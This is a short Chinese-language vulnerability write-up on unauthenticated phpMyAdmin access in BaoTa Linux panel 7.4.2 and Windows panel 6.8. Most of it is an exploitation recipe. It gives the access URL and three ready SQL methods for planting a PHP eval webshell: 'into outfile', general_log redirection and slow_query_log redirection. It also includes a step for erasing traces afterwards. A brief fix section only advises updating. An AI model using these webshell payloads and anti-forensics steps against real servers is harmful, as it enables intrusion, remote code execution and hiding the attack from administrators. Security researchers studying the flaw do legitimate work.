### 一 漏洞描述
宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞，phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。

### 二 漏洞利用
访问 `http://ip:888/pma`
直接登录 phpmyadmin


#### phpmyadmin写shell

==========================================

方法1 select into outfile直接写入:  
```
select "<?php @eval($_POST[cc]);?>" into outfile '/网站绝对路径/shell.php'
```
条件
```
select @@basedir;             查找绝对路径

show global variables like '%secure_file_priv%';    查看有没有配置 secure_file_priv 功能

NULL                          表示不允许导入或导出
/tmp                          表示只允许在 /tmp 目录导入导出
空                            表示不限制目录
```

方法2 日志文件写 shell

```
1、SHOW VARIABLES LIKE '%general%'                查看配置默认是关闭状态

2、set global general_log = on;                   开启general_log模式

3、set global general_log_file='日志路径\shell.php';       修改日志目录为shell地址 

4、select '<?php eval($_POST[cmd]);?>'            写入shell因为开启了日志记录功能，所执行的sql语句都会被记录在日志中

5、抹除痕迹
set global general_log_file='C:\\phpStudy\\MySQL\\data\\stu1.log';        修改日志目录为原来地址
set global general_log = off;                                                                      关闭general_log模式
```

方法3 慢查询日志写shell
```
1、show variables like '%slow_query_log%';                查看慢查询日志开启情况

2、set global slow_query_log=on;                          开启慢查询日志

3、set global slow_query_log_file='C:/phpStudy/WWW/shell.php';      修改日志文件存储的绝对路径

4、select '<?php @eval($_POST[shell]);?>' or sleep(10);   向日志文件中写入shell

5、使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间：
show global variables like '%long_query_time%';  

```

### 三 漏洞修复
更新宝塔为最新版本

> 参考链接  
> https://www.cnblogs.com/bflw/p/13552367.html
> phpmyadmin getshell: https://blog.csdn.net/weixin_45495060/article/details/125221896
